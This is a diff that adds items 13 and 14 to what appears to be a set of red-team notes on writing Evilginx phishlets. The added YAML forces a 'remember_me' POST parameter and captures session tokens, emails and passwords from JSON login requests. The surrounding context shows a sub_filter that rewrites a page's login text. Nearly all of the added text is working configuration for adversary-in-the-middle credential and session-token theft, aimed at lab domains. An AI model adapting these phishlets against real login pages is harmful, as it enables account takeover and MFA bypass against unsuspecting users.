@@ -28,3 +28,36 @@
      sub_filters:
         - {triggers_on: 'dummy.dum.evilginx.com', orig_sub: 'akira', domain: 'dum.evilginx.com', search: '" Login "', replace: '" Get Phished! "', mimes: ['text/javascript']}
      ```
+
+13. Forcing POST parameters, for example, to keep the user logged in even if they did not select the option. Example configuration in YAML file:
+    ```yaml
+    path: '/api/v1/auth/login'
+    search: 
+      - {key: 'email', search: '.*'}
+      - {key: 'password', search: '.*'}
+    force:
+      - {key: 'remember_me', value: '1'}
+    type: 'post'
+    ```
+
+14. No session token. What can be done? Format sent in JSON. The credential setting to check in JSON format is different.
+    * There are instances where MFA is not enabled and the token will be present in the login endpoint.
+    * Example in YAML:
+    ```yaml
+    auth_tokens:
+      - domain: 'bladerunner.lab.evilginx.com'
+        path: '/api/v1/auth/.*'
+        name: 'token'
+        search: '"token":"([^"]*)"'
+        type: 'body'
+    credentials:
+      username:
+        key: ''
+        search: '"email":"([^"]*)"'
+        type: 'json'
+      password:
+        key: ''
+        search: '"password":"([^"]*)"'
+        type: 'json'
+    ```
+
